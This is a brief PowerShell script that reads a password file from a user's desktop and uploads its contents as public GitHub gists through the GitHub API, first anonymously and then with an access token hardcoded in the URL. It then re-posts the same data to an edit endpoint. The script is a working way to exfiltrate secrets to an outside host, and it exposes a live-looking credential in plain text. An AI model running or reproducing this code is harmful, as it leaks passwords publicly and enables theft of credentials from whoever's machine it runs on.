$URL = "https://api.github.com"
$Endpoint = "/gists"

$URLAnon = "$URL$Endpoint"

$password = Get-Content C:\Users\ASUS\Desktop\pass.txt

$JSON = ConvertTo-Json @{
          description = "test fetch";
          public =  $true;
          files = @{
            "file1.txt" = @{
              content = $password
            }
          }
        }


$gist = Invoke-RestMethod -Method Post -Uri $URLAnon -Body $JSON

$Token = "?access_token=a3a22f302286ff974f923a17f7cd4706d3958504"
$URLSecure = "$URL$Endpoint$Token"

$gist = Invoke-RestMethod -Method Post -Uri $URLSecure -Body $JSON

$URLEdit = "$URL$Endpoint/$($gist.id)$Token"

$JSON2 = ConvertTo-Json @{
          description = "first password fetch2";
          public =  $true;
          files = @{
            "file1.txt" = @{
              content = $password
            }
          }
        }

$gist = Invoke-RestMethod -Method Post -Uri $URLEdit -Body $JSON2